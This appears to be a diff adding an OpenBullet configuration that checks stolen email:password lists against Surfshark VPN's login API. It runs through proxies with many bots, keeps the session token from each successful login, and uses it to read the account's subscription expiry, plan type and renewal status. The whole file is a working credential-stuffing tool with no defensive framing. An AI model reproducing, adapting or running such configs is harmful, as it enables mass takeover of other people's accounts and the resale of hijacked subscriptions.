@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "Surfshark_Huffy",
+  "SuggestedBots": 150,
+  "LastModified": "2019-04-09T23:10:59.1692585+08:00",
+  "AdditionalInfo": "",
+  "Author": "Huffy",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://account.surfshark.com/api/v1/auth/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "referer: https://account.surfshark.com/login" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+PARSE "<SOURCE>" LR "token\":\"" "\",\"" -> VAR "token" 
+REQUEST GET "https://account.surfshark.com/api/v1/payment/orders" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: Bearer <token>" 
+  HEADER "referer: https://account.surfshark.com/" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "isActive\":true" 
+PARSE "<SOURCE>" LR "subscription\":{\"" "\",\"taxCountry" -> VAR "expiration" 
+PARSE "<expiration>" LR "expiresAt\":\"" "T" -> CAP "Expires on" 
+PARSE "<SOURCE>" LR "productPlanId\":\"" "frequency\":" -> VAR "plan" 
+PARSE "<plan>" LR "name\":\"" "\"," -> CAP "Plan type" 
+PARSE "<SOURCE>" LR "renewable\":" ",\"" -> CAP "Renewable" 
